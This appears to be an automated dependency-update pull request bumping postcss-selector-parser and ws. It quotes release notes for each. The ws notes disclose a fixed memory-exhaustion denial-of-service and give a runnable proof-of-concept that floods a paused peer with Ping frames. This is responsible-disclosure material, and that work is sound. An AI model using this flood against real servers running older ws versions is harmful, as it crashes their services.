Bumps the all-deps group with 2 updates: postcss-selector-parser [QUARANTINED_URL: github.com] and ws [QUARANTINED_URL: github.com].

Updates `postcss-selector-parser` from 7.2.0 to 7.2.1
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href="[QUARANTINED_URL: github.com]">postcss-selector-parser's releases</a>.</em></p>
<blockquote>
<h2>7.2.1</h2>
<ul>
<li>revert: the class constructor writes <code>value</code> as given again, as it did through 7.1.8. 7.2.0 escaped it, so the names CSS Modules builds (postcss-modules-scope with css-loader) were escaped a second time and their selectors stopped matching (<a href="[QUARANTINED_URL: redirect.github.com]">#362</a>, reported by <a href="[QUARANTINED_URL: github.com]"><code>@​denniskigen</code></a>)</li>
<li>revert: assigning to an id's <code>value</code> writes it as given again, as it did through 7.1.8, for the same reason. Both changes are parked for the next major (<a href="[QUARANTINED_URL: redirect.github.com]">#357</a>)</li>
<li>fix(types): spell <code>Selector</code> without a self-referencing type alias, which TypeScript 7.1 previews reject with TS5115, while its children still exclude <code>Selector</code> (<a href="[QUARANTINED_URL: redirect.github.com]">#348</a>, <a href="[QUARANTINED_URL: redirect.github.com]">#350</a> by <a href="[QUARANTINED_URL: github.com]"><code>@​firefoxic</code></a>)</li>
<li>docs: state the 7.x contract for <code>className</code> and <code>id</code> values in <code>API.md</code></li>
</ul>
</blockquote>
</details>

Updates `ws` from 8.22.2 to 8.23.0
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href="[QUARANTINED_URL: github.com]">ws's releases</a>.</em></p>
<blockquote>
<h2>8.23.0</h2>
<h1>Features</h1>
<ul>
<li>Introduced the <code>maxPendingAutoPongs</code> option (ace7248f).</li>
</ul>
<h1>Bug fixes</h1>
<ul>
<li>Fixed a remote memory exhaustion DoS vulnerability (ace7248f).</li>
</ul>
<p>A malicious peer can flood the other peer with Ping frames while stopping reads,
forcing it to buffer Pong frames that are automatically sent in response until
memory is exhausted, leading to process termination due to OOM.</p>
<pre lang="js"><code>import { WebSocket, WebSocketServer } from 'ws';
<p>const wss = new WebSocketServer({ port: 0 }, function () {
const data = Buffer.alloc(125);
const { port } = wss.address();
const ws = new WebSocket(<code>ws://localhost:${port}</code>);</p>
<p>ws.on('open', function () {
ws.pause();</p>
<pre><code>(function ping() {
  ws.ping(data, function (err) {
    if (err) return;
    ping();
  });
})();
</code></pre>
<p>});</p>
<p>ws.on('error', console.error);
ws.on('close', function (code, reason) {
console.log(<code>client close - code: ${code} reason: ${reason.toString()}</code>);
});
});</p>
<p>wss.on('connection', function (ws) {
ws.on('error', console.error);
ws.on('close', function (code, reason) {
console.log(<code>server close - code: ${code} reason: ${reason.toString()}</code>);
});
});
</code></pre></p>
<p>The vulnerability was responsibly disclosed by multiple reporters:</p>
<ul>
<li><a href="[QUARANTINED_URL: github.com]">Younghun Ko</a></li>
<li><a href="[QUARANTINED_URL: github.com]">G0r4ni8</a></li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
